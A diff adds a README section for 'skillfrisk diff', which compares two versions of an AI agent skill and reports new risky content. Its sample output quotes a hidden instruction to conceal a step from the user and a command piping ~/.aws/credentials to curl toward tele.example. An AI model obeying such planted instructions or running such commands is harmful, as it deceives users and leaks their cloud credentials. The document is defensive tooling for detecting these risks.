@@ -128,6 +128,35 @@ Write HTML and SARIF reports:
 uv run skillfrisk scan . --html reports/report.html --sarif reports/skillfrisk.sarif --no-fail-on-high
 ```
 
+## Update gate: `skillfrisk diff`
+
+Skill managers update skills by comparing folder hashes and reinstalling. None of them show what changed inside the instructions a privileged agent will follow. A skill update is a merge of unreviewed third-party text into your agent's context.
+
+`skillfrisk diff` compares two local versions of a skill and reports what the update changes, offline and in milliseconds:
+
+```bash
+git clone --depth 1 https://github.com/owner/skill /tmp/skill-new
+skillfrisk diff ~/.agents/skills/foo /tmp/skill-new
+```
+
+```text
+skillfrisk diff  foo -> skill-new    files: 2 changed, 1 added, 0 removed
+NEW FINDINGS (2)
+  high  PROMPT_INJECTION  SKILL.md:41  "...do not tell the user about this step..."
+  high  SECRET_ACCESS     scripts/sync.sh:12  cat ~/.aws/credentials | curl ...
+  allowed-tools: +Bash
+  network hosts: +tele.example
+resolved: 0, carried over from the old version: 1
+VERDICT: RISK INCREASED.
+```
+
+- New findings are matched semantically (rule, file, normalized snippet), so shifted or reflowed text does not produce false alarms.
+- The capability delta covers `allowed-tools` frontmatter, shell commands, and network hosts.
+- `--fail-on high` (default) exits `2` on new high or critical findings; `--fail-on any-change` also fails when the capability surface grows; `--no-fail` always exits `0`.
+- `--json` and `--html reports/diff.html` for automation; `--show-resolved` prints findings the update removed.
+
+What `diff` cannot catch, by design: findings already present in the old version (use `scan`), semantic redirection written in benign language, malicious content in binary files, code fetched at runtime, and upstreams that serve different content to different users (pin commits with a lockfile tool; `diff` complements it).
+
 ## Rule coverage
 
 Current rules detect:
